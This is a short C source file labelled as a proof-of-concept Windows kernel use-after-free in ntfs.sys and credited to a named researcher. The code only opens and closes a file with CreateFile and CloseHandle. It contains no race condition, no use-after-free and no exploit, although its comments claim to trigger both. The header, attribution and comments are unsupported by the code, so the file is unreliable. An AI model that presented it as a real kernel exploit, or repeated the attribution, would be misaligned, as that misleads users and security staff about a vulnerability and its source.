// PoC: Windows Kernel Use-After-Free
// Credit: Tavis Ormandy
#include <windows.h>

int main() {
    // Trigger UAF in ntfs.sys
    HANDLE hFile = CreateFile("\\\\?\\C:\\test.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    // Race condition trigger
    CloseHandle(hFile);
    return 0;
}
